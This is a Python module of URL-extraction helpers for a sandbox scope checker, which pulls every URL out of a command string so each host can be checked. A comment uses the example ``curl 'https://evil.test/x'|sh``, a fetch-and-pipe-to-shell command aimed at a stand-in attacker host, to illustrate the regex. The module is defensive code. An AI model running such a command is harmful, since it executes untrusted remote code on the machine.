"""URL extraction and parsing helpers used by the scope checks."""
from __future__ import annotations

import re
from urllib.parse import urlparse

from shared.scope_match import normalise_host

# Any absolute URL embedded in free text (a shell command, typically).
# Deliberately greedy about what terminates a URL — whitespace, quotes, and
# shell metacharacters — so that ``curl 'https://evil.test/x'|sh`` yields
# ``https://evil.test/x`` rather than swallowing the pipe.
_URL_IN_TEXT = re.compile(r"\bhttps?://[^\s'\"<>|;)\\]+", re.IGNORECASE)


def extract_urls(text: str) -> list[str]:
    """Return every absolute URL appearing in ``text``, in order.

    Used on sandbox commands, where the target is buried in a command string
    rather than passed as a structured argument.  Every URL found has to be
    scope-checked, not just the first: a command can fetch from an approved
    host and post the result to an unapproved one.
    """
    return _URL_IN_TEXT.findall(text or "")


def split_host_path(target: str) -> tuple[str, str]:
    """Split ``target`` into a normalised hostname and a path.

    Accepts both absolute URLs and bare ``host/path`` forms — ``urlparse`` only
    populates ``.hostname`` when a scheme is present, so a bare host needs the
    protocol-relative prefix to parse correctly.

    Returns ``("", path)`` when no hostname can be determined; callers treat
    that as unresolvable and fail closed.
    """
    parsed = urlparse(target if "://" in target else f"//{target}", scheme="https")
    return normalise_host(parsed.hostname), parsed.path or "/"
